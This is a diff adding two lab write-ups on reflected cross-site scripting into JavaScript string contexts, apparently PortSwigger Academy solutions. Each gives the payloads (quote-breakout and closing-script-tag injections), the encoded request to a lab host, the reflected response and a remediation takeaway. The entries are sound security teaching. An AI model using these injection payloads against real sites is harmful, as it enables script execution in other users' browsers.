@@ -288,3 +288,95 @@ javascript:alert(1)
 6. Click the author's name link. The browser evaluates the `javascript:` pseudo-protocol, executing the script and triggering the `alert(1)` pop-up.
 
 > **Key Takeaway:** Encoding double quotes (`&quot;`) prevents attribute breakout, but it fails to secure URL-accepting attributes like `href` or `src`. To prevent XSS in URL contexts, applications must validate that user-supplied input uses safe schemes (`http://`, `https://`) or relative path slashes (`/`) before rendering them into the DOM.
+
+---
+
+### [PS-XSS-09] Reflected XSS into a JavaScript string with angle brackets HTML-encoded
+
+**Scenario:** The application reflects the user's search query directly inside a JavaScript string literal within an inline `<script>` tag. Although angle brackets (`<` and `>`) are HTML-encoded by the server—preventing an attacker from closing the `<script>` tag—single quotes (`'`) are left unescaped. This allows an attacker to terminate the string literal, introduce custom JavaScript commands, and execute arbitrary code.
+
+**Solution:**
+
+1. Perform a search for an arbitrary string (e.g., `test`) on the home page.
+2. View the page source or inspect the HTTP response in Burp Repeater to locate where the search term reflects inside an inline `<script>` block:
+
+```javascript
+<script>
+    var searchTerms = 'test';
+</script>
+
+```
+
+3. Craft an XSS payload using a single quote (`'`) to terminate the string, a semicolon (`;`) to end the assignment statement, the payload function, and line comment markers (`//`) to neutralize the trailing single quote:
+
+```javascript
+';alert(1)//
+
+```
+
+4. Submit the payload via the search field or query parameter:
+
+```http
+GET /?search=%27%3Balert%281%29%2F%2F HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+5. Inspect the server's HTML response to confirm how the script parses:
+
+```javascript
+<script>
+    var searchTerms = '';alert(1)//';
+</script>
+
+```
+
+6. Render the page in the browser. The JavaScript engine closes the `searchTerms` variable assignment, executes `alert(1)`, and ignores the remainder of the original statement due to the comment (`//`).
+
+> **Key Takeaway:** Standard HTML entity encoding (such as converting `<` to `&lt;`) provides zero protection when user input reflects inside a JavaScript context. To safely handle dynamic values inside scripts, applications must use JavaScript-specific escaping (e.g., Unicode escaping like `\x27` for quotes), serialize data using JSON, or pass data via HTML `data-*` attributes rather than direct script interpolation.
+
+---
+
+### [PS-XSS-10] Reflected XSS into a JavaScript string with single quote and backslash escaped
+
+**Scenario:** The application reflects user input inside a JavaScript string literal within an inline `<script>` block. The server escapes both single quotes (`'`) and backslashes (`\`), preventing attackers from terminating the string or escaping the quote handler. However, because the reflection occurs directly within inline HTML `<script>` tags, the browser's HTML parser processes tag boundaries before the JavaScript engine executes the code. An attacker can close the entire script element using `</script>` and inject a new HTML/JavaScript context.
+
+**Solution:**
+
+1. Submit a search query with test characters (e.g., `test'\"`) on the home page.
+2. View the page source or inspect the response in Burp Repeater to observe how single quotes and backslashes are escaped:
+
+```javascript
+<script>
+    var searchTerms = 'test\'\\\"';
+</script>
+
+```
+
+3. Craft an XSS payload that ignores the JavaScript string syntax completely and targets the HTML element boundary by closing the inline `<script>` tag:
+
+```html
+</script><script>alert(1)</script>
+
+```
+
+4. Submit the payload via the search field or query parameter:
+
+```http
+GET /?search=%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+5. Inspect the server's HTML response to confirm how the browser receives the markup:
+
+```html
+<script>
+    var searchTerms = '</script><script>alert(1)</script>';
+</script>
+
+```
+
+6. Render the page in the browser. The HTML parser encounters `</script>` inside the string literal, immediately terminates the first script element, and then parses and executes the subsequent `<script>alert(1)</script>` block.
+
+> **Key Takeaway:** HTML parsing takes precedence over JavaScript parsing for inline script blocks. Escaping JavaScript-specific characters (like quotes and backslashes) is ineffective if an attacker can introduce HTML tag delimiters. To remediate this, applications must HTML-encode angle brackets (`<` and `>`) when reflecting input inside inline script tags, or ideally load dynamic values via dedicated data attributes or JSON APIs.
